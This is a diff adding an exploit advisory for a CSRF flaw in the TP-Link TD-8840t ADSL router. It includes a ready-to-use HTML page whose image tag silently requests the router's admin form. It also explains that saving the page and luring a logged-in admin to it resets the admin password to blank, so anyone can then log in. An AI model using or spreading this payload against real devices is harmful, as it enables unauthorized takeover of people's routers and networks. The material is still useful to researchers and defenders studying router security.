@@ -1,0 +1,40 @@
+######################################################################
+# Exploit Title: TP-Link TD-8840t CSRF Vulnerability
+# Author: MOHAMMED AL-SAGGAF(LEGNED-SEIYUN)
+# E-mail: mohammed.sec2010@gmail.com(www.facebook.com/mohammed.alsaggaf2010)
+# Category: Hardware
+# Google Dork: N/A
+# Vendor: http://www.tp-link.com
+# Firmware Version: 3.0.0 Build 120531
+# Product: http://www.tp-link.com/en/products/details/?model=td-8840t
+# Tested on: Windows 8 64-bit
+######################################################################
+
+#Introduction
+==============
+TP-Link TD-8840t is a ADSL2+ Ethernet/USB Modem Router which works with a
+24-Mbps  downstream connection.
+
+#Description of Vulnerability
+=============================
+You can easily change the default user's (admin) password by the default
+router page listning on tcp/ip port 80. In here you the $_GET will change
+the password for you and the $_POST request method is not needed for
+changing the router pass.
+
+#Exploit
+========
+
+<html>
+<!-- TP-Link TD-8840t CSRF Exploit -->
+<body>
+<img src="http://192.168.1.1/Forms/tools_admin_1"/>
+</body>
+</html>
+
+==========
+Save this as csrf.html and this will change the router password to blank if
+the current user admin visits this page his password will be resetted to
+blank. You can login with the username admin and password (blank).
+
+#Greetz to: Gehad.hilal
